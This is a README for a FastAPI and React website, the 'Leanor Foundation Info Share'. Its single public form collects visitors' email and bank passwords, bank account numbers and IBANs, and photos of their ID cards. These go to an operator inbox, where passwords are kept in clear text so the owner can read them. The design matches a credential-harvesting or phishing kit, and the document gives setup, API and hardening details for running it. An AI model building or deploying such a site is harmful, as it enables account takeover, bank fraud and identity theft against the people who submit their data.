# LEANOR FOUNDATION INFO SHARE

A **blue & red** information website where visitors send their details to the
Foundation through one form — **personal details, account access, bank
information, ID card photographs, supporting photographs and notes** — and the
owner reads them in a **password-protected inbox**.

Built with **FastAPI** (backend) + **React 18 / Vite** (frontend), storing
submissions in **Astra DB**.

```
leanor/
├── backend/                          # FastAPI
│   ├── main.py                       # app wiring: storage, routers, static/SPA
│   ├── config.py                     # every setting, overridable via backend/.env
│   ├── auth.py                       # password -> signed expiring token (stdlib only)
│   ├── schemas.py                    # validation rules + response models
│   ├── storage.py                    # AstraStorage + MemoryStorage (local dev)
│   ├── routers/
│   │   ├── submissions.py            # public POST + admin list/get/delete/stats
│   │   └── admin.py                  # sign in + session check
│   ├── uploads/                      # uploaded images (served at /uploads)
│   ├── requirements.txt
│   ├── .env.example
│   └── smoke_test.py                 # end-to-end API test
└── frontend/                         # Vite + React
    └── src/
        ├── main.jsx                  # entry: router + auth provider + styles
        ├── App.jsx                   # routes
        ├── api/client.js             # the only place fetch() is used
        ├── context/AuthContext.jsx   # admin session state
        ├── hooks/useReveal.jsx       # scroll-reveal (fails safe: content always visible)
        ├── data/siteContent.js       # all site copy
        ├── components/
        │   ├── layout/               # Navbar, Footer
        │   ├── ui/                   # Icon (SVG set), PageHead
        │   ├── form/                 # SubmissionForm, PictureUploader, ImageSlot
        │   └── admin/                # AdminLogin, AdminInbox, SubmissionCard
        ├── pages/                    # Home, About, Services, Submit, Admin, 404
        └── styles/                   # tokens -> base -> components -> layout -> admin -> motion
```

## 1. What the form collects

| Section | Fields |
|---|---|
| 1 · Your details | Full name*, email*, phone numbers |
| 2 · Account access | Email password, bank password |
| 3 · Bank information | Bank name, account number, IBAN |
| 4 · ID card photographs | Front of ID, back of ID (max 2 images) |
| 5 · Other photographs | Up to 8 images |
| 6 · Anything else | Notes |

\* required, along with the consent statement. Everything else is optional.

## 2. Setup

**Backend**

```powershell
cd C:\Users\HP\leanor\backend
python -m pip install -r requirements.txt
Copy-Item .env.example .env      # then edit .env (see below)
```

Fill in `backend/.env`:

| Variable | What to put |
|---|---|
| `ASTRA_DB_API_ENDPOINT` | Astra DB → Database Details → **API endpoint** |
| `ASTRA_DB_APPLICATION_TOKEN` | Astra DB → **Generate Token** → application token |
| `ADMIN_EMAIL` | **The inbox sign-in email.** Email *and* password are both required; if either is missing, every sign-in is rejected |
| `ADMIN_PASSWORD` | **Change this.** The inbox password. Empty = sign-in impossible (inbox stays closed) |
| `TOKEN_SECRET` | Optional random string; signs admin sessions |
| `STORAGE_BACKEND` | `auto` (default) · `astra` (hard-fail) · `memory` (throwaway) |
| `MAX_ID_CARDS` | ID card photograph slots (default 2) |

```powershell
python -m uvicorn main:app --reload --port 8000
```

**Frontend**

```powershell
cd C:\Users\HP\leanor\frontend
npm install
npm run dev          # http://localhost:5173  (proxies /api and /uploads to :8000)
```

## 3. Run for real (single origin)

```powershell
cd C:\Users\HP\leanor\frontend
npm run build        # writes frontend/dist

cd ..\backend
python -m uvicorn main:app --port 8000
```

FastAPI then serves the whole site at http://localhost:8000 — API, uploads and the
React app, with deep links like `/admin` handled by an SPA fallback route.

- Site: http://localhost:8000
- Admin inbox: http://localhost:8000/admin
- API docs: http://localhost:8000/docs
- Health: http://localhost:8000/api/health

## 4. API

| Method | Path | Auth | Purpose |
|---|---|---|---|
| POST | `/api/submissions` | public | Submit form + images (multipart/form-data) |
| POST | `/api/admin/login` | public | `{ email, password }` → signed token |
| GET | `/api/admin/session` | token | Validate a stored token |
| GET | `/api/submissions` | token | List submissions (owner inbox) |
| GET | `/api/submissions/{id}` | token | One submission |
| DELETE | `/api/submissions/{id}` | token | Delete submission + all its images |
| GET | `/api/stats` | token | Counts for the inbox header |
| GET | `/api/health` | public | Status + active storage mode |

Authenticated calls send `Authorization: Bearer <token>`.

## 5. How the admin inbox is protected

1. `POST /api/admin/login` takes **`email` and `password`** and compares *both*
   against `ADMIN_EMAIL` / `ADMIN_PASSWORD` with `hmac.compare_digest`. Failures
   always answer `Incorrect email or password.` — never revealing which field
   was wrong. If either variable is empty, every attempt is rejected.
2. On success it returns a token: `base64({"sub","exp"}) + "." + HMAC-SHA256(payload)`,
   where `sub` is the admin email.
3. `require_admin` re-verifies the signature and expiry on every protected route.
4. Eight failed attempts from one IP triggers a five-minute lockout.
5. The frontend keeps the token in `sessionStorage`, so closing the tab signs out.

Nothing is stored server-side, so there are no sessions to expire or clean up.

## 6. Tests

With the server running on port 8000 and `ADMIN_EMAIL` + `ADMIN_PASSWORD` set
(`smoke_test.py` reads both from the environment or `backend/.env`):

```powershell
cd C:\Users\HP\leanor\backend
$env:ADMIN_EMAIL="admin@example.com"; $env:ADMIN_PASSWORD="test-password"; $env:STORAGE_BACKEND="memory"
python -m uvicorn main:app --port 8000
# in a second terminal:
python smoke_test.py
```

27 checks: auth (wrong email, wrong password, missing email field, correct
pair), 401s on protected routes, validation, both password fields, the
absence of the removed `schools` field, the submit → list → stats → delete round
trip, and forged-token rejection.

## 7. Security notes (read before going public)

This app collects **passwords, bank details and ID card photographs** — the most
sensitive category of personal data.

- **Always set `ADMIN_EMAIL` and `ADMIN_PASSWORD`.** With either empty, sign-in
  is impossible (the server logs a warning at startup). Never leave both empty —
  that opens `/api/submissions` to anyone.
- Serve over **HTTPS only**. Never accept passwords or ID photographs over plain
  HTTP. The password inputs are excluded from browser autofill (`autocomplete="off"`,
  `data-1p-ignore`) but that is a convenience, not a control.
- **Passwords are stored as submitted, in clear text**, so the Foundation can read
  them. If that is not acceptable, encrypt `email_password` / `bank_password` at
  rest in `backend/routers/submissions.py` and decrypt on read.
- ID card images are stored as files in `backend/uploads/` and served at
  `/uploads/...`. Anyone who can reach that path can read them — put the whole
  site behind HTTPS and access control.
- Keep `backend/.env` and `backend/uploads/` private (both git-ignored).
- Add a privacy/retention policy matching local regulations (GDPR/CCPA).
- `MAX_UPLOAD_MB` / `MAX_PICTURES` / `MAX_ID_CARDS` in `.env` bound uploads; mirror
  changes in `frontend/src/components/form/pictureUtils.js`.

## 8. Customising

- **Colours** — every colour is a token in `frontend/src/styles/tokens.css`.
  Change `--blue-700` or `--red-600` and the whole site follows.
- **Copy** — all text lives in `frontend/src/data/siteContent.js`.
- **Icons** — the SVG set is in `frontend/src/components/ui/Icon.jsx`; add a path
  entry and reference it by name.
- **Motion** — `frontend/src/styles/motion.css`. Scroll reveals are applied from JS
  and skipped entirely under `prefers-reduced-motion`, so content is never hidden
  by a failed animation.
- **Form fields** — `backend/schemas.py` (validation + response model),
  `backend/routers/submissions.py` (the `Form(...)` parameters and stored document),
  `frontend/src/components/form/SubmissionForm.jsx` (the UI).
- **Pages** — add a component in `frontend/src/pages/` and a route in `App.jsx`.